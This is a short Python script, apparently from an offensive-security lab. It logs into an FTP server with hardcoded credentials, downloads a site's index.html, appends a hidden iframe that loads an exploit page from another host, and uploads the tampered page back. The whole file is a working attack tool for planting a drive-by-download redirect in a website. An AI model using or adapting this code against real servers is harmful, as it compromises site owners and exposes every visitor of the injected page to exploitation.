import ftplib
def injectPage(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR' + page, f.write)
    print "[+] Downloaded Page: " + page
    f.write(redirect)
    f.close()
    print "[+] Injected Mailcious IFrame on: " + page
    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print "[+] Uploaded Injected Page: " + page
host = "192.168.1.186"
userName = "pi"
passWord = "yellowsea"
ftp = ftplib.FTP(host)
ftp.login(userName, passWord)
redirect = '<iframe src="http://192.168.1.185:8080/exploit"></iframe>'
injectPage(ftp, 'index.html', redirect)
